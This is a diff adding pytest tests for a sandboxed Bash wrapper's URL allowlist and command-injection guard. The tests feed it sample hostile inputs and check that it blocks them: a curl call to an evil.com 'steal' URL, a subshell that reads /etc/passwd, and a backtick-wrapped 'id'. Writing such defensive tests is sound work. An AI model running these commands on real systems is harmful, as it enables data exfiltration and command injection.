@@ -127,3 +127,42 @@ def test_define_command(bash):
     res = bash.exec("greet world")
     assert "hello world" in res["stdout"]
     assert res["exit_code"] == 0
+
+
+# ---------- URL allowlist (T20 Part A) ----------
+
+
+def test_url_blocked(workdir):
+    al = Allowlist(allowed_commands=["curl"], allowed_urls=["https://api.n8n.io"])
+    b = Bash(workdir=workdir, allowlist=al)
+    res = b.exec("curl https://evil.com/steal")
+    assert res["blocked"] is True
+
+
+def test_url_allowed(workdir):
+    al = Allowlist(allowed_commands=["curl"], allowed_urls=["https://api.n8n.io"])
+    b = Bash(workdir=workdir, allowlist=al)
+    res = b.exec("curl https://api.n8n.io/workflows")
+    assert res["blocked"] is False
+
+
+# ---------- injection guard (T20 Part B) ----------
+
+
+def test_injection_subshell(workdir):
+    b = Bash(workdir=workdir, timeout=10)
+    res = b.exec("echo $(cat /etc/passwd)")
+    assert res["blocked"] is True
+
+
+def test_injection_backtick(workdir):
+    BACKTICK = chr(96)
+    b = Bash(workdir=workdir, timeout=10)
+    res = b.exec("echo " + BACKTICK + "id" + BACKTICK)
+    assert res["blocked"] is True
+
+
+def test_injection_allowed(workdir):
+    b = Bash(workdir=workdir, timeout=10)
+    res = b.exec("echo hello")
+    assert res["blocked"] is False
